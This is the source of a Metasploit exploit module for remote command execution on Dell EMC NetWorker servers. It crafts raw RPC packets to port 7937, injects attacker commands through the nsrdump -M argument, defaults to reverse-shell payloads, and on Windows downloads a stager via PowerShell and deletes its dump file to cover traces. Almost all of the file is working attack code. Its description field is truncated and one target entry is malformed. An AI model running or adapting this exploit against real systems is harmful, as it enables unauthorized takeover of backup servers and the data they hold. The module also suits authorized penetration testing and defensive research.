##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Dell EMC Networker Server RCE',
        'Description'    => %q{
          The
        },
          'Author'         =>
        [
          'Quentin Kaiser',
        ],
        'License'        => MSF_LICENSE,
        'Privileged'     => 'true',
        'Targets' =>
        [
          [ 'Unix',
               'Platform' => 'unix',
               'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse'},
          ],
          [
            'Windows',
            {
              'Platform' => 'win',
              'CmdStagerFlavor' => 'psh_invokewebrequest',
              'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' }
            }
          ]
        ],
        'DefaultTarget'  => 0,
      )
    )

    register_options(
      [
        Opt::RPORT(7937)
      ])
  end

  def add_header(rpc_request)
    rpc_header = [0x80000000 + rpc_request.length].pack('I>')
    return rpc_header + rpc_request
  end

  def pad(content, pad_len=4)
    return content + "\x00" * (pad_len - (content.length % pad_len))
  end

  def rpc_base

    client_hostname = "\x00" * 16

    # craft_rpc_header
    rpc_request = ""
    rpc_request << [0x5ebb5810].pack('I>') # XID
    rpc_request << [0x00000000].pack('I>') # message_type
    rpc_request << [0x00000002].pack('I>') # rpc version
    rpc_request << [0x0005f3e1].pack('I>') # rpc program
    rpc_request << [0x00000001].pack('I>') # program version
    rpc_request << [0x00000006].pack('I>') # rpc procedure
    rpc_request << [0x00000001].pack('I>') # unknown
    rpc_request << [0x00000030].pack('I>') # unknown
    rpc_request << [0x5ebb5810].pack('I>') # XID

    # oldauth, we add the client hostname
    rpc_request << [client_hostname.length].pack('I>')
    rpc_request << pad(client_hostname, pad_len=4)

    # TLV
    rpc_request << [0x00000000].pack('I>') # type
    rpc_request << [0x00000000].pack('I>') # length
    rpc_request << [0x00000002].pack('I>') # value

    # TLV
    rpc_request << [0x00000000].pack('I>') # type
    rpc_request << [0x00000000].pack('I>') # length
    rpc_request << [0x00000000].pack('I>') # value

    # TLV
    rpc_request << [0x00000000].pack('I>') # type
    rpc_request << [0x00000001].pack('I>') # length
    rpc_request << [0x00000071].pack('I>') # value

    # unknown
    rpc_request << [0x00000001].pack('I>') # ?
    return rpc_request
  end


  def craft_rpc_request(command)

    instruction = "command"

    rpc_request = rpc_base()
    # TLV (instruction)
    rpc_request << [0x00000001].pack('I>')
    rpc_request += [instruction.length].pack('I>') # length
    rpc_request += pad(instruction)

    # TLV (command)
    rpc_request << [0x00000001].pack('I>')
    rpc_request << [command.length].pack('I>') # length
    rpc_request << pad(command)

    rpc_request << [0x00000000].pack('I>')
    rpc_request << [0x00000000].pack('I>')

    rpc_payload = add_header(rpc_request)
    return rpc_payload
  end

  def confirm_payload
    payload = ""
    payload << [0x00000007].pack('I>')
    payload << [0x00000000].pack('I>')
    payload << [0x00000001].pack('I>')
    payload << [0x00000001].pack('I>')
    payload << [0x00000000].pack('I>')
    return payload
  end

  def execute_command(cmd, opts={})
    begin
      # SEND: send the message to the node
      output = ""
      dumpfile = Rex::Text.rand_text_alpha(8)

      if target['Platform'] == 'unix'
        command = "nsrdump -m root@localhost -o #{dumpfile} -M \"#{cmd.to_s};\""
      else
        command = "nsrdump -m root@localhost -o #{dumpfile} -M '#{cmd.to_s} & del \"C:\\\\Program Files\\\\EMC NetWorker\\\\nsr\\\\applogs\\\\rh\\\\#{dumpfile}\" & '"
      end
      payload = craft_rpc_request(command)
      sock.put(payload)
      data = sock.recv(1024)
      sock.put(confirm_payload())
      while true
        data = sock.recv(1024)
        output += data
        if data.include? "\x80\x00\x00\x03\x00\x00\x00\x01"
          break
        end
      end
      if target['Platform'] == 'unix'
        print(output[24..].match(/([^\x00]+)/)[0])
      end
    rescue IOError, EOFError => e
      print_status("Exception: #{e.class}:#{e}")
    end
    handler
    disconnect
  end

  def exploit
    connect
    print_status('Exploiting...')
    if target['Platform'] == 'win'
      execute_cmdstager()
    else
      execute_command(payload.raw)
    end
  end
end
